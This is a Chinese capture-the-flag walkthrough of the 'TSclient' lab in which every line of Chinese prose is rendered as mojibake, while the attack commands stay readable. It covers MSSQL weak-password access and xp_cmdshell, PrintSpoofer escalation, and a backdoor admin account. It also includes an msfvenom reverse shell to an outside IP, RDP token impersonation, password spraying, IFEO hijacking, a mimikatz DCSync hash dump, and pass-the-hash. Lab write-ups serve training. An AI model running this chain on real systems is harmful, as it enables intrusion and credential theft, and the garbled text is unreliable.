\næ˜¥ç§‹äº‘é•œ TSclient \u0026ndash; Walkthrough - KingBridge - åšå®¢å›­\næ˜¥ç§‹äº‘å¢ƒ Tsclient | åˆé›¶Â·b10g~ğŸ¥\nFLAG1 å…ˆç”¨fscanæ‰«ä¸€ä¸‹\nmssqlæœåŠ¡æ˜¯å¼±å£ä»¤\nsa/1qaz!QAZ ç”¨æ•°æ®åº“ç®¡ç†å·¥å…·è¿ä¸Šå»\næ¥ä¸‹æ¥è¦çœ‹mssqlæ€ä¹ˆè¿›è¡Œå‘½ä»¤æ‰§è¡Œ\nå‚è€ƒæ–‡ç« ï¼š\nhttps://xz.aliyun.com/news/7129\nåˆ¤æ–­xp_cmdshellçŠ¶æ€\nselect * from master.dbo.sysobjects where xtype=\u0026#39;x\u0026#39; and name=\u0026#39;xp_cmdshell\u0026#39; å­˜åœ¨\né‚£æˆ‘ä»¬æ¥ä¸‹æ¥å¯åŠ¨å®ƒ\nEXEC sp_configure \u0026#39;show advanced options\u0026#39;, 1;RECONFIGURE;EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1;RECONFIGURE; é…ç½®é€‰é¡¹ \u0026#39;xp_cmdshell\u0026#39; å·²ä» 0 æ›´æ”¹ä¸º 1ã€‚è¯·è¿è¡Œ RECONFIGURE è¯­å¥è¿›è¡Œå®‰è£…ã€‚ å¯åŠ¨æˆåŠŸ\næ¥ä¸‹æ¥å°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†\nexec master..xp_cmdshell \u0026#39;whoami\u0026#39; æ¥ä¸‹æ¥ç›´æ¥vshellä¸€å¥è¯ä¸Šçº¿\næ²¡æ‰¾åˆ°flagï¼Œå‘ç°Administratoræ–‡ä»¶å¤¹æ²¡æœ‰æƒé™\næƒ³åˆ°è¦ææƒï¼Œä¼ ä¸€ä¸ªPrintSpooferè¿›è¡Œææƒ\nhttps://github.com/whojeff/PrintSpoofer\n1PrintSpoofer.exe -i -c cmd ææƒä¹‹åæ‹¿åˆ°flag\n1C:\\Tmp\u0026gt;type C:\\Users\\Administrator\\flag\\flag01.txt 2 _________ ________ ________ ___ ___ _______ ________ _________ 3|\\___ ___\\\\ ____\\|\\ ____\\|\\ \\ |\\ \\|\\ ___ \\ |\\ ___ \\|\\___ ___\\ 4\\|___ \\ \\_\\ \\ \\___|\\ \\ \\___|\\ \\ \\ \\ \\ \\ \\ __/|\\ \\ \\\\ \\ \\|___ \\ \\_| 5 \\ \\ \\ \\ \\_____ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\_|/_\\ \\ \\\\ \\ \\ \\ \\ \\ 6 \\ \\ \\ \\|____|\\ \\ \\ \\____\\ \\ \\____\\ \\ \\ \\ \\_|\\ \\ \\ \\\\ \\ \\ \\ \\ \\ 7 \\ \\__\\ ____\\_\\ \\ \\_______\\ \\_______\\ \\__\\ \\_______\\ \\__\\\\ \\__\\ \\ \\__\\ 8 \\|__| |\\_________\\|_______|\\|_______|\\|__|\\|_______|\\|__| \\|__| \\|__| 9 \\|_________| 10 11 12Getting flag01 is easy, right? 13 14flag01: flag{5ee60dcf-4f7b-4e2a-977e-cbf1697d8df4} 15 16 17Maybe you should focus on user sessions... ææƒä¹‹åç”¨ææƒåçš„è´¦æˆ·é‡æ–°ä¸Šä¸€ä¸‹çº¿\næ¥ä¸‹æ¥ç”¨fscanæ‰«ä¸€ä¸‹å†…ç½‘\n1â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” 2â”‚ ___ _ â”‚ 3â”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚ 4â”‚ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / â”‚ 5â”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; â”‚ 6â”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚ 7â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ 8 Fscan Version: 2.0.0 9 10[2025-03-09 19:53:19] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1 11[2025-03-09 19:53:19] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ 12[2025-03-09 19:53:19] [INFO] CIDRèŒƒå›´: 172.22.8.0-172.22.8.255 13[2025-03-09 19:53:20] [INFO] ç”ŸæˆIPèŒƒå›´: 172.22.8.0.%!d(string=172.22.8.255) - %!s(MISSING).%!d(MISSING) 14[2025-03-09 19:53:20] [INFO] è§£æCIDR 172.22.8.0/24 -\u0026gt; IPèŒƒå›´ 172.22.8.0-172.22.8.255 15[2025-03-09 19:53:20] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256 16[2025-03-09 19:53:20] [INFO] å¼€å§‹ä¸»æœºæ‰«æ 17[2025-03-09 19:53:20] [INFO] æ­£åœ¨å°è¯•æ— ç›‘å¬ICMPæ¢æµ‹... 18[2025-03-09 19:53:20] [INFO] å½“å‰ç”¨æˆ·æƒé™ä¸è¶³,æ— æ³•å‘é€ICMPåŒ… 19[2025-03-09 19:53:20] [INFO] åˆ‡æ¢ä¸ºPINGæ–¹å¼æ¢æµ‹... 20[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.31 å­˜æ´» (ICMP) 21[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.18 å­˜æ´» (ICMP) 22[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.15 å­˜æ´» (ICMP) 23[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.46 å­˜æ´» (ICMP) 24[2025-03-09 19:53:23] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 4 25[2025-03-09 19:53:23] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233 26[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:88 27[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:80 28[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:80 29[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:139 30[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:139 31[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:135 32[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:135 33[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:135 34[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:135 35[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:139 36[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:139 37[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:445 38[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:445 39[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:445 40[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:445 41[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:389 42[2025-03-09 19:53:26] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:1433 43[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:88 =\u0026gt; 44[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:80 =\u0026gt; [http] 45[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:80 =\u0026gt; [http] 46[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:139 =\u0026gt; Banner:[.] 47[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:139 =\u0026gt; Banner:[.] 48[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:139 =\u0026gt; Banner:[.] 49[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:139 =\u0026gt; Banner:[.] 50[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:445 =\u0026gt; 51[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:445 =\u0026gt; 52[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:445 =\u0026gt; 53[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:445 =\u0026gt; 54[2025-03-09 19:53:31] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:1433 =\u0026gt; [ms-sql-s] ç‰ˆæœ¬:13.00.1601 äº§å“:Microsoft SQL Server 2016 ç³»ç»Ÿ:Windows Banner:[.%.A.] 55[2025-03-09 19:53:35] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:389 =\u0026gt; 56[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:135 =\u0026gt; 57[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:135 =\u0026gt; 58[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:135 =\u0026gt; 59[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:135 =\u0026gt; 60[2025-03-09 19:54:29] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 17 61[2025-03-09 19:54:30] [INFO] å¼€å§‹æ¼æ´æ‰«æ 62[2025-03-09 19:54:30] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ldap, ms17010, mssql, netbios, smb, smb2, smbghost, webpoc, webtitle 63[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 64ç›®æ ‡ä¸»æœº: 172.22.8.18 65ä¸»æœºå: WIN-WEB 66å‘ç°çš„ç½‘ç»œæ¥å£: 67 IPv4åœ°å€: 68 â””â”€ 172.22.8.18 69 IPv6åœ°å€: 70 â””â”€ 2001:0:348b:fb58:1445:3719:d89d:8092 71[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT 72[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 73ç›®æ ‡ä¸»æœº: 172.22.8.15 74ä¸»æœºå: DC01 75å‘ç°çš„ç½‘ç»œæ¥å£: 76 IPv4åœ°å€: 77 â””â”€ 172.22.8.15 78[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 79ç›®æ ‡ä¸»æœº: 172.22.8.46 80ä¸»æœºå: WIN2016 81å‘ç°çš„ç½‘ç»œæ¥å£: 82 IPv4åœ°å€: 83 â””â”€ 172.22.8.46 84[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 85ç›®æ ‡ä¸»æœº: 172.22.8.31 86ä¸»æœºå: WIN19-CLIENT 87å‘ç°çš„ç½‘ç»œæ¥å£: 88 IPv4åœ°å€: 89 â””â”€ 172.22.8.31 90[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.46 WIN2016.xiaorang.lab Windows Server 2016 Datacenter 14393 91[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.15 DC:XIAORANG\\DC01 92[2025-03-09 19:54:30] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.8.46 çŠ¶æ€ç :200 é•¿åº¦:703 æ ‡é¢˜:IIS Windows Server 93[2025-03-09 19:54:30] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.8.18 çŠ¶æ€ç :200 é•¿åº¦:703 æ ‡é¢˜:IIS Windows Server 94[2025-03-09 19:54:31] [SUCCESS] MSSQL 172.22.8.18:1433 sa 1qaz!QAZ 95[2025-03-09 19:54:53] [SUCCESS] æ‰«æå·²å®Œæˆ: 32/32 æ‰«åˆ°ä¸‰å°æœºå­\nNetBios 172.22.8.46 WIN2016.xiaorang.lab NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT\rNetBios 172.22.8.15 DC:XIAORANG\\DC01 æ²¡æœ‰ä»€ä¹ˆèƒ½ç›´æ¥åˆ©ç”¨çš„æœåŠ¡\né‚£æˆ‘ä»¬æ¥ç€ä¿¡æ¯æ”¶é›†ä¸€ä¸‹\nnet user ä¸»æœºå: WIN-WEB\rOS åç§°: Microsoft Windows Server 2016 Datacenter\rOS ç‰ˆæœ¬: 10.0.14393 æš‚ç¼º Build 14393\rOS åˆ¶é€ å•†: Microsoft Corporation\rOS é…ç½®: ç‹¬ç«‹æœåŠ¡å™¨\rOS æ„ä»¶ç±»å‹: Multiprocessor Free\ræ³¨å†Œçš„æ‰€æœ‰äºº:\ræ³¨å†Œçš„ç»„ç»‡: Aliyun\räº§å“ ID: 00376-40000-00000-AA947\råˆå§‹å®‰è£…æ—¥æœŸ: 2022/7/11, 12:46:14\rç³»ç»Ÿå¯åŠ¨æ—¶é—´: 2025/3/9, 18:28:29\rç³»ç»Ÿåˆ¶é€ å•†: Alibaba Cloud\rç³»ç»Ÿå‹å·: Alibaba Cloud ECS\rç³»ç»Ÿç±»å‹: x64-based PC\rå¤„ç†å™¨: å®‰è£…äº† 1 ä¸ªå¤„ç†å™¨ã€‚\r[01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz\rBIOS ç‰ˆæœ¬: SeaBIOS 449e491, 2014/4/1\rWindows ç›®å½•: C:\\Windows\rç³»ç»Ÿç›®å½•: C:\\Windows\\system32\rå¯åŠ¨è®¾å¤‡: \\Device\\HarddiskVolume1\rç³»ç»ŸåŒºåŸŸè®¾ç½®: zh-cn;ä¸­æ–‡(ä¸­å›½)\rè¾“å…¥æ³•åŒºåŸŸè®¾ç½®: zh-cn;ä¸­æ–‡(ä¸­å›½)\ræ—¶åŒº: (UTC+08:00) åŒ—äº¬ï¼Œé‡åº†ï¼Œé¦™æ¸¯ç‰¹åˆ«è¡Œæ”¿åŒºï¼Œä¹Œé²æœ¨é½\rç‰©ç†å†…å­˜æ€»é‡: 3,950 MB\rå¯ç”¨çš„ç‰©ç†å†…å­˜: 883 MB\rè™šæ‹Ÿå†…å­˜: æœ€å¤§å€¼: 5,848 MB\rè™šæ‹Ÿå†…å­˜: å¯ç”¨: 1,169 MB\rè™šæ‹Ÿå†…å­˜: ä½¿ç”¨ä¸­: 4,679 MB\ré¡µé¢æ–‡ä»¶ä½ç½®: C:\\pagefile.sys\råŸŸ: WORKGROUP\rç™»å½•æœåŠ¡å™¨: æš‚ç¼º\rä¿®è¡¥ç¨‹åº: å®‰è£…äº† 6 ä¸ªä¿®è¡¥ç¨‹åºã€‚\r[01]: KB5013625\r[02]: KB4049065\r[03]: KB4486129\r[04]: KB4486131\r[05]: KB5014026\r[06]: KB5013952\rç½‘å¡: å®‰è£…äº† 1 ä¸ª NICã€‚\r[01]: Red Hat VirtIO Ethernet Adapter\rè¿æ¥å: ä»¥å¤ªç½‘\rå¯ç”¨ DHCP: æ˜¯\rDHCP æœåŠ¡å™¨: 172.22.255.253\rIP åœ°å€\r[01]: 172.22.8.18\r[02]: fe80::205a:dd47:2165:6397\rHyper-V è¦æ±‚: å·²æ£€æµ‹åˆ°è™šæ‹Ÿæœºç›‘æ§ç¨‹åºã€‚å°†ä¸æ˜¾ç¤º Hyper-V æ‰€éœ€çš„åŠŸèƒ½ã€‚ C:\\Tmp\u0026gt;net user\r\\\\ çš„ç”¨æˆ·å¸æˆ·\r-------------------------------------------------------------------------------\rAdministrator DefaultAccount Guest\rJohn test\rå‘½ä»¤è¿è¡Œå®Œæ¯•ï¼Œä½†å‘ç”Ÿä¸€ä¸ªæˆ–å¤šä¸ªé”™è¯¯ã€‚ C:\\Tmp\u0026gt;quser\rç”¨æˆ·å ä¼šè¯å ID çŠ¶æ€ ç©ºé—²æ—¶é—´ ç™»å½•æ—¶é—´\rjohn rdp-tcp#0 2 è¿è¡Œä¸­ 2:38 2025/3/9 18:30 å‘ç°ä¸€ä¸ªjohnç”¨æˆ·è¿œç¨‹è¿æ¥æœ¬å°æœºå­\nä¸ºäº†æ–¹ä¾¿å¯ä»¥æ–°å»ºä¸€ä¸ªç”¨æˆ·rdpè¿ä¸Šå»\nC:\\Tmp\u0026gt;net user xrntkk Abc20060201 /add\rå‘½ä»¤æˆåŠŸå®Œæˆã€‚\rC:\\Tmp\u0026gt;net localgroup administrators xrntkk /add\rå‘½ä»¤æˆåŠŸå®Œæˆã€‚\rC:\\Tmp\u0026gt;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\ræ“ä½œæˆåŠŸå®Œæˆã€‚ ç®¡ç†å‘˜æƒé™å¯ä»¥å·RDPç”¨æˆ·çš„tokenï¼Œä»è€ŒæŸ¥çœ‹å…¶æŒ‚è½½çš„ç›˜ã€‚\nè¿™é‡Œå¯ä»¥ç”¨msfçš„incognitoæ¨¡å—\nubuntu@VM-20-9-ubuntu:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=106.55.168.231 LPORT=9999 -f exe -o msf.exe\r[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payload\rNo encoder specified, outputting raw payload\rPayload size: 510 bytes\rFinal size of exe file: 7168 bytes\rSaved as: msf.exe å…ˆç”¨msfä¸Šä¸ªçº¿\nmsfconsole\ruse exploit/multi/handler\rset payload windows/x64/meterpreter/reverse_tcp\rset lhost 106.55.168.231\rset lport 9999\rexploit ä¸Šçº¿\næ¥ç€ç”¨incognitoæ¨¡å—å·Johnçš„token\n1meterpreter \u0026gt; use incognito 2Loading extension incognito...Success. 3meterpreter \u0026gt; list_tokens -u 4 5Delegation Tokens Available 6======================================== 7IIS APPPOOL\\DefaultAppPool 8NT AUTHORITY\\LOCAL SERVICE 9NT AUTHORITY\\NETWORK SERVICE 10NT AUTHORITY\\SYSTEM 11NT SERVICE\\MsDtsServer130 12NT SERVICE\\MSSQLFDLauncher 13NT SERVICE\\MSSQLSERVER 14NT SERVICE\\MSSQLServerOLAPService 15NT SERVICE\\ReportServer 16NT SERVICE\\SQLTELEMETRY 17NT SERVICE\\SSASTELEMETRY 18NT SERVICE\\SSISTELEMETRY130 19WIN-WEB\\John 20WIN-WEB\\test 21WIN-WEB\\xrntkk 22Window Manager\\DWM-1 23Window Manager\\DWM-2 24Window Manager\\DWM-3 25Window Manager\\DWM-4 26 27Impersonation Tokens Available 28======================================== 29No tokens available å¯ä»¥çœ‹åˆ°å·²ç»æ‹¿åˆ°Johnçš„tokenäº†\nä»¥Johnçš„èº«ä»½è¿è¡Œcmd\n1meterpreter \u0026gt; impersonate_token WIN-WEB\\\\John 2[+] Delegation token available 3[+] Successfully impersonated user WIN-WEB\\John 4meterpreter \u0026gt; shell 5Process 7508 created. 6Channel 1 created. 7... 8 9C:\\Tmp\u0026gt;whoami 10whoami 11win-web\\john net use çœ‹ä¸€ä¸‹æŒ‚è½½æƒ…å†µï¼ˆä¸çŸ¥é“ä¸ºå•¥æˆ‘è¿™ä¹±ç äº†ï¼‰\næŒ‚è½½äº†cç›˜\næŸ¥çœ‹cç›˜ä¸­çš„credential.txtæ–‡ä»¶\nC:\\Tmp\u0026gt;type \\\\TSCLIENT\\C\\credential.txt\rtype \\\\TSCLIENT\\C\\credential.txt\rxiaorang.lab\\Aldrich:Ald@rLMWuy7Z!#\rDo you know how to hijack Image? è¿™é‡Œæœ‰ä¸€ä¸²è´¦å·å¯†ç ï¼Œç”¨è¿™ä¸²è´¦å·å¯†ç è¿›è¡Œä¸€ä¸ªå¯†ç å–·æ´’\ncrackmapexec -q smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Z!# â”Œâ”€â”€(rootã‰¿Xrntkk-Laptop)-[/home/xrntkk]\râ””â”€# proxychains4 -q crackmapexec smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Zproxychains4 crackmapexec smb 172.22.8.0/24\r-u Aldrich -p Ald@rLMWuy7Z\rSMB 172.22.8.18 445 WIN-WEB [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)\rSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.46 445 WIN2016 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)\rSMB 172.22.8.18 445 WIN-WEB [-] WIN-WEB\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.31 445 WIN19-CLIENT [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE å¯ä»¥çœ‹åˆ°è¿™ä¸‰å°æœºè²Œä¼¼éƒ½èƒ½ç™»ä¸Šå»\nSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False) æˆ‘è¿™é‡Œé€‰æ‹©ç™»31\nproxychains4 rdesktop 172.22.8.31 -u Aldrich -d xiaorang.lab -p \u0026#39;Ald@rLMWuy7Z!#\u0026#39; è¿™é‡Œè¦ç”¨rdesktopç™»ï¼Œrdpç™»ä¸ä¸Š\nä¼šæç¤ºå¯†ç è¿‡æœŸï¼Œæ”¹ä¸ªå¯†ç å°±è¡Œäº†\nä½†æ˜¯æ”¹å®Œå¯†ç è¿™å°æœºè¿˜æ˜¯ç™»ä¸ä¸Šï¼Œæ²¡æœ‰ç™»é™†æƒé™\næ‰€ä»¥æˆ‘ä»¬å°è¯•ç”¨è¿™ä¸ªä¿®æ”¹åçš„è´¦å·å¯†ç å†å»ç™»è¿™ä¸ªè´¦å·çš„å¦ä¸€å°æœºå­\næˆåŠŸåœ¨46ä¸­ç™»å…¥ï¼Œåé¢è¿˜æ˜¯ç”¨rdpå§ï¼Œrdesktopä¹Ÿå¤ªå¡äº†\nxiaorang.lab\\Aldrich\rAbc123456 FLAG2 ä¿¡æ¯æ”¶é›†ä¸€ä¸‹\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æ‹¿ä¸‹åŸŸå†…çš„ä¸€å°æœºå­äº†\nsysteminfo è¿™å°æœºå­ä¸å‡ºç½‘ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å…±äº«æ–‡ä»¶å¤¹çš„æ–¹å¼æ¥ä¼ æ–‡ä»¶\nè¿™é‡Œæˆ‘æ˜¯ç”¨ç¬¬ä¸€å°æœºå­(172.22.8.18)ï¼Œå°†æ–‡ä»¶å¤¹C:/xrntkkå…±äº«ç»™(172.22.8.46)\nåœ¨46ä¸ŠWin+Rå¹¶è¾“å…¥\n\\\\172.22.8.18 è¾“å…¥18å…±äº«æ–‡ä»¶çš„è´¦å·å¯†ç å³å¯\næ¥ç€æˆ‘ä»¬ç”¨bloodhoundæ¥è¿›è¡Œä¸€ä¸‹åŸŸå†…ä¿¡æ¯æ”¶é›†\nSharpHound.exe -c all å°†æ•°æ®é‡‡é›†å®Œç”Ÿæˆçš„zipæ–‡ä»¶ï¼Œä¸Šä¼ å¯¼å…¥åˆ°BloodHoundåˆ†æ\nä»å›¾ä¸­ï¼Œæˆ‘ä»¬ä¼šå‘ç°46è¿™å°æœºå­çš„ç”¨æˆ·æ˜¯åŸŸç®¡ï¼Œé‚£æˆ‘ä»¬æ¥ä¸‹æ¥å°±è¦æƒ³åŠæ³•åœ¨è¿™å°æœºå­ä¸Šææƒï¼Œç„¶åæ‹¿ä¸‹åŸŸæ§\næ ¹æ®å‰é¢çš„hint\nDo you know how to hijack Image? æˆ‘ä»¬å¯ä»¥çŸ¥é“æ¥ä¸‹æ¥è¦è¿›è¡Œé•œåƒåŠ«æŒ(IFEO)ææƒ\nGet-ACL -Path \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\u0026#34; | fl è¿™æ¡å‘½ä»¤çš„æ„æ€æ˜¯è·å–æŒ‡å®šæ³¨å†Œè¡¨è·¯å¾„çš„è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰ã€‚\nNT AUTHORITY\\Authenticated Users æˆ‘ä»¬å¯ä»¥å‘ç°å…¨éƒ¨å·²ç™»å½•ç”¨æˆ·éƒ½å¯ä»¥å¯¹æ³¨å†Œè¡¨è¿›è¡Œä¿®æ”¹\né‚£æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨è¿›è¡Œæ˜ åƒåŠ«æŒ\næˆ‘ä»¬è¿™é‡Œé€šè¿‡å°†æ”¾å¤§é•œå¯åŠ¨çš„magnify.exeæ›¿æ¢æˆC:\\windows\\system32\\cmd.exeï¼Œæ¥è¿›è¡Œææƒ\n1REG ADD \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\u0026#34; /v Debugger /t REG_SZ /d \u0026#34;C:\\windows\\system32\\cmd.exe\u0026#34; ä¿®æ”¹åé€‰æ‹©é”å®š\nåœ¨é”å®šé¡µé¢é€‰æ‹©æ”¾å¤§é•œå³å¯\ntype c:\\Users\\Administrator\\flag\\flag02.txt æ¥ç€æˆ‘ä»¬å¯ä»¥æ–°å»ºä¸€ä¸ªç”¨æˆ·è®©rdpå¯ä»¥è¿ä¸Šå»\nFLAG3 æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„çš„å°†åŸŸå†…ç”¨æˆ·çš„å“ˆå¸Œdumpä¸‹æ¥\nmimikatz.exe \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit \u0026gt; mimikatz.txt ç»“æœ\n.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\r.## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo)\r## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\r## \\ / ## \u0026gt; https://blog.gentilkiwi.com/mimikatz\r\u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com )\r\u0026#39;#####\u0026#39; \u0026gt; https://pingcastle.com / https://mysmartlogon.com ***/\rmimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv\r[DC] \u0026#39;xiaorang.lab\u0026#39; will be the domain\r[DC] \u0026#39;DC01.xiaorang.lab\u0026#39; will be the DC server\r[DC] Exporting domain \u0026#39;xiaorang.lab\u0026#39;\r[rpc] Service : ldap\r[rpc] AuthnSvc : GSS_NEGOTIATE (9)\r502\tkrbtgt\t3ffd5b58b4a6328659a606c3ea6f9b63\t514\r1000\tDC01$\t7408967f1fd3c2ff807232b7b5c5fc95\t532480\r500\tAdministrator\t2c9d81bdcf3ec8b1def10328a7cc2f08\t512\r1103\tWIN2016$\taae3dca76f254c52708ee076935bb533\t16781312\r1104\tWIN19-CLIENT$\t7c011200ecbe666945e465c200afcb5e\t16781312\r1105\tAldrich\t0607f770c2f37e09a850e09e920a9f45\t512\rmimikatz(commandline) # exit\rBye! ä¹‹åå°±å¯ä»¥è¿›è¡Œæ¨ªå‘ç§»åŠ¨äº†\nproxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk type c:\\users\\administrator\\flag\\flag03.txt æ‹¿åˆ°æœ€åä¸€ä¸ªflag\nC:\\Windows\\system32\u0026gt;type c:\\users\\administrator\\flag\\flag03.txt\r_________ __ _ _\r| _ _ | [ | (_) / |_\r|_/ | | \\_|.--. .---. | | __ .---. _ .--. `| |-\u0026#39;\r| | ( (`\\] / /\u0026#39;`\\] | | [ |/ /__\\\\[ `.-. | | |\r_| |_ `\u0026#39;.\u0026#39;. | \\__. | | | || \\__., | | | | | |,\r|_____| [\\__) 